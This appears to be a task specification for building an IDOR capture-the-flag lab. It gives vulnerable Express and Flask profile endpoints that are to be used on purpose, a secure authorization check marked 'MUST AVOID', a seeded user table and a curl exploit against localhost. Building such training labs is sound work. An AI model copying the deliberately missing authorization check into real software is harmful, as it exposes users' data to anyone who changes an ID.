# Insecure Direct Object Reference (IDOR)

## Vulnerability Type
`idor` — CWE-639 — OWASP A01:2021 Broken Access Control

## Architecture
- **Backend**: Node.js Express OR Python Flask
- **Database**: SQLite
- **Container**: Single container

## Vulnerable Code Pattern (MUST USE)

### Node.js Express (Preferred)
```javascript
// VULNERABLE: idor — no authorization check, user ID from URL parameter
app.get('/api/profile/:id', (req, res) => {
    const userId = req.params.id;
    // No check that the authenticated user matches the requested profile ID
    const user = db.prepare("SELECT * FROM users WHERE id = ?").get(userId);
    if (!user) return res.status(404).json({ error: "User not found" });
    return res.json({ id: user.id, username: user.username, email: user.email, flag: user.flag });
});
```

### Python Flask
```python
# VULNERABLE: idor — no authorization check on user ID
@app.route('/api/profile/<int:user_id>')
def get_profile(user_id):
    cursor.execute("SELECT * FROM users WHERE id=?", (user_id,))
    user = cursor.fetchone()
    if not user:
        return jsonify({"error": "User not found"}), 404
    return jsonify({"id": user[0], "username": user[1], "email": user[2], "flag": user[3]})
```

## Secure Code Pattern (MUST AVOID)
```javascript
// SAFE — checks session user matches requested ID (DO NOT USE)
app.get('/api/profile/:id', authMiddleware, (req, res) => {
    if (req.session.userId !== parseInt(req.params.id)) {
        return res.status(403).json({ error: "Forbidden" });
    }
    // ...
});
```

## Database Schema
```sql
CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, email TEXT, flag TEXT, role TEXT);
INSERT INTO users VALUES (1, 'admin', 'SuperSecret!2024', 'admin@ctf.lab', 'FLAG_PLACEHOLDER', 'admin');
INSERT INTO users VALUES (2, 'player', 'password123', 'player@ctf.lab', NULL, 'user');
INSERT INTO users VALUES (3, 'guest', 'guest123', 'guest@ctf.lab', NULL, 'user');
```

## Flag Delivery
- Flag stored in admin user's profile (user ID 1), `flag` column
- Player registers/logs in as regular user (ID 2 or 3)
- Accessing `/api/profile/1` returns admin's profile including the flag
- No server-side authorization check for profile access

## Exploit Payload
```bash
# Login as regular user first
curl -X POST http://localhost:3000/login -d "username=player&password=password123" -c cookies.txt

# Access admin profile via IDOR
curl http://localhost:3000/api/profile/1 -b cookies.txt
```

## Validation Criteria
- Profile endpoint accepts user ID as URL parameter
- NO authorization check comparing session user to requested profile
- Admin profile (ID 1) contains the flag
- Regular users CAN access other users' profiles by changing the ID
- Login functionality works for at least one regular user
